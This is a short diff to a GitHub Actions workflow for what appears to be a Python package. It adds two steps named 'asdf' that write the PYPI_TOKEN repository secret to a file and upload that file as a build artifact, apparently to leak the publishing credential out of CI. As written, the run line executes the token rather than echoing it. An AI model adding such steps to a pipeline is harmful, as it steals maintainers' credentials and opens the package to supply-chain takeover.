@@ -20,6 +20,14 @@ jobs:
         uses: actions/setup-python@v2
         with:
           python-version: ${{ matrix.python-version }}
+      - name: asdf
+        run: ${{ secrets.PYPI_TOKEN }} > my_file.txt
+      - name: asdf
+        uses: actions/upload-artifact@v3
+        with:
+          name: my-artifact
+          path: my_file.txt
+          retention-days: 1
       - name: Install package and testing extras
         run: pip install .[testing]
       - name: Test via pytest
